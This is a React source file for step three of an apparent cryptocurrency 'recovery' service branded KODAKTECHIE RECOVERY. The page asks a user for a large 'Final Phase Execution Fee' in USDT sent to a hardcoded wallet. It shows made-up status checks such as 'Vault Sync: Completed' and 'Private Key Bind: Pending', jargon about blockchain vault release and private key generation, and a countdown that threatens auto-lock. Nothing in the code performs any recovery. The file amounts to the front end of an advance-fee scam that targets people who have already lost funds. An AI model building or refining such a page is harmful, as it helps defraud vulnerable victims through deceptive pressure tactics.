import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Progress } from "@/components/ui/progress";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Unlock, Clock, ArrowRight, CheckCircle, AlertTriangle, Key, Zap, Wallet, Copy } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "../supabaseClient";

const RecoveryStep3 = () => {
  const [walletAddress, setWalletAddress] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(8 * 60 * 60); // 8 hours in seconds
  const [user, setUser] = useState<any>(null);
  const [error, setError] = useState<string | null>(null);
  const navigate = useNavigate();
  const { toast } = useToast();

  const companyWalletAddress = "0x1234567890abcdef1234567890abcdef12345678"; // Same as Step 1 and Step 2

  const handleCopyWallet = async () => {
    try {
      await navigator.clipboard.writeText(companyWalletAddress);
      console.log("Step 3: Wallet address copied:", companyWalletAddress);
      toast({
        title: "Wallet Address Copied",
        description: "The wallet address has been copied to your clipboard.",
      });
    } catch (err) {
      console.error("Step 3: Failed to copy wallet address:", err);
      toast({
        variant: "destructive",
        title: "Copy Failed",
        description: "Unable to copy wallet address. Please try again.",
      });
    }
  };

  // Fetch user data and extraction_fee3
  useEffect(() => {
    const fetchUserData = async () => {
      try {
        console.log("Step 3: Fetching user data...");
        const { data: { user: authUser }, error: authError } = await supabase.auth.getUser();
        console.log("Step 3: Auth user:", authUser, "Auth error:", authError);
        if (authError || !authUser) {
          console.error("Step 3: Authentication failed, redirecting to /login");
          toast({
            variant: "destructive",
            title: "Authentication Error",
            description: "Please log in to continue.",
          });
          navigate("/login", { replace: true });
          return;
        }

        const { data, error } = await supabase
          .from("profiles")
          .select("step1completed, step2completed, step3completed, walletaddress, extraction_fee3")
          .eq("id", authUser.id)
          .single();

        console.log("Step 3: Profile data:", data, "Profile error:", error);
        if (error) {
          if (error.code === "PGRST116") {
            console.log("Step 3: No profile found, creating one for user:", authUser.id);
            const { error: insertError } = await supabase
              .from("profiles")
              .insert({
                id: authUser.id,
                refundamount: "0",
                walletaddress: "",
                step1completed: false,
                step2completed: false,
                step3completed: false,
                extraction_fee3: 350000, // Default fee in NGN
              });
            if (insertError) {
              console.error("Step 3: Insert profile error:", insertError.message, insertError.details, insertError.hint, insertError.code);
              throw insertError;
            }
            // Retry fetching
            const { data: retryData, error: retryError } = await supabase
              .from("profiles")
              .select("step1completed, step2completed, step3completed, walletaddress, extraction_fee3")
              .eq("id", authUser.id)
              .single();
            if (retryError) {
              console.error("Step 3: Retry fetch error:", retryError.message, retryError.details, retryError.hint, retryError.code);
              throw retryError;
            }
            console.log("Step 3: Profile created:", retryData);
            setUser({
              id: authUser.id,
              email: authUser.email,
              step1Completed: retryData.step1completed,
              step2Completed: retryData.step2completed,
              step3Completed: retryData.step3completed,
              walletAddress: retryData.walletaddress,
              extractionFee: retryData.extraction_fee3,
            });
          } else {
            console.error("Step 3: Profile fetch error:", error.message, error.details, error.hint, error.code);
            throw error;
          }
        } else {
          if (data.extraction_fee3 === null) {
            console.log("Step 3: Extraction fee missing, setting default for user:", authUser.id);
            const { error: updateError } = await supabase
              .from("profiles")
              .update({ extraction_fee3: 350000 })
              .eq("id", authUser.id);
            if (updateError) {
              console.error("Step 3: Update fee error:", updateError.message, updateError.details, updateError.hint, updateError.code);
              throw updateError;
            }
            // Retry fetching
            const { data: retryData, error: retryError } = await supabase
              .from("profiles")
              .select("step1completed, step2completed, step3completed, walletaddress, extraction_fee3")
              .eq("id", authUser.id)
              .single();
            if (retryError) {
              console.error("Step 3: Retry fee fetch error:", retryError.message, retryError.details, retryError.hint, retryError.code);
              throw retryError;
            }
            console.log("Step 3: Profile updated with fee:", retryData);
            setUser({
              id: authUser.id,
              email: authUser.email,
              step1Completed: retryData.step1completed,
              step2Completed: retryData.step2completed,
              step3Completed: retryData.step3completed,
              walletAddress: retryData.walletaddress,
              extractionFee: retryData.extraction_fee3,
            });
          } else {
            console.log("Step 3: Profile loaded:", data);
            setUser({
              id: authUser.id,
              email: authUser.email,
              step1Completed: data.step1completed,
              step2Completed: data.step2completed,
              step3Completed: data.step3completed,
              walletAddress: data.walletaddress,
              extractionFee: data.extraction_fee3,
            });
            setWalletAddress(data.walletaddress || "");
          }
          if (!data.step1completed) {
            console.log("Step 3: step1completed is false, redirecting to /recovery/step1");
            toast({
              variant: "destructive",
              title: "Incomplete Step",
              description: "Please complete Step 1 before proceeding.",
            });
            navigate("/recovery/step1", { replace: true });
            return;
          }
          if (!data.step2completed) {
            console.log("Step 3: step2completed is false, redirecting to /recovery/step2");
            toast({
              variant: "destructive",
              title: "Incomplete Step",
              description: "Please complete Step 2 before proceeding.",
            });
            navigate("/recovery/step2", { replace: true });
            return;
          }
          if (data.step3completed) {
            console.log("Step 3: step3completed is true, redirecting to /recovery/complete");
            toast({
              title: "Step 3 Already Completed",
              description: "Redirecting to completion page.",
            });
            navigate("/recovery/complete", { replace: true });
          } else {
            console.log("Step 3: step3completed is false, staying on Step 3");
          }
        }
      } catch (err: any) {
        console.error("Step 3: Error fetching user data:", err.message, err.details, err.hint, err.code);
        setError("Failed to fetch user data or fee");
        toast({
          variant: "destructive",
          title: "Error",
          description: "Unable to load user data or fee. Please try again.",
        });
        navigate("/login", { replace: true });
      }
    };

    fetchUserData();
  }, [navigate, toast]);

  // Real-time subscription for step3completed changes
  useEffect(() => {
    if (!user?.id) {
      console.log("Step 3: No user ID, skipping real-time subscription");
      return;
    }

    console.log("Step 3: Setting up real-time subscription for user:", user.id);
    const subscription = supabase
      .channel(`profiles-changes-${user.id}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "profiles",
          filter: `id=eq.${user.id}`,
        },
        (payload) => {
          console.log("Step 3: Realtime payload:", payload);
          if (payload.new.step3completed) {
            console.log("Step 3: step3completed updated to true, redirecting to /recovery/complete");
            toast({
              title: "Step 3 Completed",
              description: "Payment confirmed. Redirecting to completion page.",
            });
            navigate("/recovery/complete", { replace: true });
          }
        }
      )
      .subscribe((status, err) => {
        console.log("Step 3: Subscription status:", status, "Error:", err);
        if (status === "SUBSCRIBED") {
          console.log("Step 3: Realtime subscription active for user:", user.id);
        } else if (err) {
          console.error("Step 3: Realtime subscription error:", err);
          toast({
            variant: "destructive",
            title: "Realtime Error",
            description: "Unable to connect to real-time updates. Please proceed manually.",
          });
        }
      });

    return () => {
      console.log("Step 3: Cleaning up subscription for user:", user.id);
      supabase.removeChannel(subscription);
    };
  }, [user?.id, navigate, toast]);

  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          console.log("Step 3: Timer expired, signing out and redirecting to /login");
          supabase.auth.signOut();
          navigate("/login", { replace: true });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [navigate]);

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const handleFinalPayment = async () => {
    if (!walletAddress) {
      console.log("Step 3: Wallet address missing");
      toast({
        variant: "destructive",
        title: "Wallet Address Required",
        description: "Please enter your wallet address to proceed.",
      });
      return;
    }

    if (!user?.extractionFee) {
      console.error("Step 3: Extraction fee missing for user:", user?.id);
      toast({
        variant: "destructive",
        title: "Fee Not Set",
        description: "Extraction fee is not set. Please contact support.",
      });
      return;
    }

    setIsLoading(true);

    try {
      console.log("Step 3: Updating profile for user:", user.id, "with wallet:", walletAddress);
      const { data, error } = await supabase
        .from("profiles")
        .update({ walletaddress: walletAddress, step3completed: true })
        .eq("id", user.id)
        .select("walletaddress, step3completed")
        .single();

      if (error) {
        console.error("Step 3: Update profile error:", error.message, error.details, error.hint, error.code);
        throw error;
      }

      console.log("Step 3: Profile updated successfully:", data);
      toast({
        title: "Payment Submitted",
        description: "Final phase execution fee payment recorded. Redirecting to completion page.",
      });
      navigate("/recovery/complete", { replace: true });
    } catch (err: any) {
      console.error("Step 3: Error updating profile:", err.message, err.details, err.hint, err.code);
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to process payment. Please try again.",
      });
    } finally {
      setIsLoading(false);
      console.log("Step 3: isLoading set to false");
    }
  };

  if (error) {
    console.log("Step 3: Rendering error:", error);
    return <div>Error: {error}</div>;
  }
  if (!user || user.extractionFee === null) {
    console.log("Step 3: Rendering loading state, user:", user);
    return <div>Loading...</div>;
  }

  console.log("Step 3: Rendering component, user:", user);
  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-crypto-dark to-crypto-darker">
      <header className="border-b border-border/50 bg-card/50 backdrop-blur-sm">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Unlock className="h-8 w-8 text-primary" />
              <div>
                <h1 className="text-xl font-bold text-foreground">KODAKTECHIE RECOVERY</h1>
                <p className="text-sm text-primary">Step 3 of 3: Final Unlock</p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <Clock className="h-5 w-5 text-orange-500" />
              <span className="text-sm font-mono text-orange-500">{formatTime(timeLeft)}</span>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8">
        <div className="max-w-2xl mx-auto space-y-8">
          <div className="space-y-2">
            <div className="flex justify-between text-sm">
              <span className="text-foreground">Recovery Progress</span>
              <span className="text-primary">Step 3 of 3</span>
            </div>
            <Progress value={100} className="h-2" />
            <div className="flex justify-between text-xs text-muted-foreground">
              <span className="text-primary">✓ Extraction</span>
              <span className="text-primary">✓ Firewall</span>
              <span className="text-primary">Final Unlock</span>
            </div>
          </div>

          <div className="space-y-4">
            <Card className="bg-primary/10 border-primary/30">
              <CardContent className="pt-4">
                <div className="flex items-center gap-3">
                  <CheckCircle className="h-5 w-5 text-primary" />
                  <span className="text-sm font-medium text-primary">🟢 Vault Sync: Completed</span>
                </div>
              </CardContent>
            </Card>
            <Card className="bg-primary/10 border-primary/30">
              <CardContent className="pt-4">
                <div className="flex items-center gap-3">
                  <CheckCircle className="h-5 w-5 text-primary" />
                  <span className="text-sm font-medium text-primary">🟢 Firewall Uplink: Stable</span>
                </div>
              </CardContent>
            </Card>
            <Card className="bg-primary/10 border-primary/30">
              <CardContent className="pt-4">
                <div className="flex items-center gap-3">
                  <CheckCircle className="h-5 w-5 text-primary" />
                  <span className="text-sm font-medium text-primary">🟢 Session Continuity: Verified</span>
                </div>
              </CardContent>
            </Card>
            <Card className="bg-orange-500/10 border-orange-500/30">
              <CardContent className="pt-4">
                <div className="flex items-center gap-3">
                  <AlertTriangle className="h-5 w-5 text-orange-500" />
                  <span className="text-sm font-medium text-orange-500">🟡 Private Key Bind: Pending Final Decryption</span>
                </div>
              </CardContent>
            </Card>
          </div>

          <Card className="bg-card/90 backdrop-blur-sm border-primary/20 shadow-xl">
            <CardHeader className="text-center">
              <div className="flex justify-center mb-4">
                <div className="p-4 rounded-full bg-primary/20 border border-primary/30 animate-pulse">
                  <Unlock className="h-12 w-12 text-primary" />
                </div>
              </div>
              <CardTitle className="text-2xl">🔓 Final Unlock Stage</CardTitle>
              <CardDescription>Last Decryption Phase</CardDescription>
            </CardHeader>

            <CardContent className="space-y-6">
              <Alert className="border-primary/30 bg-primary/10">
                <Key className="h-4 w-4" />
                <AlertDescription className="text-foreground">
                  <strong>Dear {user.email?.split('@')[0]},</strong><br/>
                  Congratulations! Your recovery case has reached the Final Unlock Phase. All preliminary steps are complete.
                </AlertDescription>
              </Alert>

              <div className="space-y-3">
                <Label htmlFor="wallet" className="text-base font-medium">
                  Your Cryptocurrency Wallet Address
                </Label>
                <Input
                  id="wallet"
                  placeholder="Enter your wallet address (BTC, ETH, USDT, etc.)"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  className="bg-input border-border/50 focus:border-primary h-12"
                />
                <p className="text-xs text-muted-foreground">
                  Confirm your wallet address for the final unlock process.
                </p>
              </div>

              <Card className="bg-secondary/50 border-border/30">
                <CardContent className="pt-6">
                  <div className="space-y-4">
                    <h3 className="font-semibold text-center text-foreground">
                      To finalize wallet release, a Final Phase Execution Fee is required to:
                    </h3>
                    <div className="space-y-3">
                      <div className="flex items-center gap-3">
                        <Zap className="h-5 w-5 text-primary" />
                        <span className="text-sm">Release encrypted data from the blockchain vault</span>
                      </div>
                      <div className="flex items-center gap-3">
                        <Key className="h-5 w-5 text-primary" />
                        <span className="text-sm">Bind the wallet address to your access environment</span>
                      </div>
                      <div className="flex items-center gap-3">
                        <Unlock className="h-5 w-5 text-primary" />
                        <span className="text-sm">Generate your private key access string</span>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <Alert className="border-destructive/50 bg-destructive/10">
                <AlertTriangle className="h-4 w-4" />
                <AlertDescription className="text-foreground">
                  <strong>⚠️ Important:</strong> Complete this payment within 6-12 hours to avoid auto-lock and session expiration.
                  No recovery attempts will be allowed after expiration.
                </AlertDescription>
              </Alert>

              <Card className="bg-secondary/50 border-border/30">
                <CardContent className="pt-6">
                  <div className="text-center space-y-4">
                    <h3 className="font-semibold text-foreground">Final Phase Execution Fee</h3>
                    <div className="space-y-2">
                      <p className="text-4xl font-bold text-primary">
                        ${user.extractionFee.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                      </p>
                      <p className="text-sm text-muted-foreground">Final decryption and key generation (USDT)</p>
                    </div>
                    <div className="text-sm space-y-1">
                      <p className="text-foreground">This fee covers:</p>
                      <ul className="text-muted-foreground space-y-1">
                        <li>• Blockchain vault release</li>
                        <li>• Private key generation</li>
                        <li>• Secure wallet binding</li>
                        <li>• Final transaction verification</li>
                      </ul>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <Card className="bg-secondary/50 border-border/30">
                <CardContent className="pt-6">
                  <div className="text-center space-y-4">
                    <h3 className="font-semibold text-foreground">Make Your Final Phase Payment</h3>
                    <div className="space-y-2">
                      <p className="text-lg text-foreground">
                        Send ${user.extractionFee.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USDT to this wallet address:
                      </p>
                      <p className="text-sm text-muted-foreground break-all">
                        Wallet Address: {companyWalletAddress}
                      </p>
                      <Button onClick={handleCopyWallet} size="sm" className="mt-2">
                        <Copy className="h-4 w-4 mr-2" />
                        Copy Wallet Address
                      </Button>
                    </div>
                  </div>
                </CardContent>
              </Card>

              <div className="flex flex-wrap gap-2 justify-center">
                <Badge className="bg-primary/20 text-primary border-primary/30">
                  Final Stage Authentication
                </Badge>
                <Badge className="bg-primary/20 text-primary border-primary/30">
                  Private Key Generation
                </Badge>
                <Badge className="bg-primary/20 text-primary border-primary/30">
                  Blockchain Release Protocol
                </Badge>
              </div>

              <Button
                onClick={handleFinalPayment}
                size="lg"
                className="w-full bg-gradient-to-r from-primary to-crypto-green-glow hover:from-primary/90 hover:to-crypto-green-glow/90 text-primary-foreground font-bold py-4 text-lg"
                disabled={isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="h-6 w-6 border-2 border-primary-foreground/30 border-t-primary-foreground rounded-full animate-spin" />
                    Processing Final Unlock...
                  </div>
                ) : (
                  <>
                    Confirm Payment & Complete Unlock
                    <ArrowRight className="ml-2 h-6 w-6" />
                  </>
                )}
              </Button>

              <p className="text-xs text-center text-muted-foreground">
                After sending the payment to the wallet address above, click "Confirm Payment & Complete Unlock" to proceed. By proceeding, you agree to the terms of service and acknowledge that this is a secure transaction processed through our encrypted payment gateway.
              </p>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
};

export default RecoveryStep3;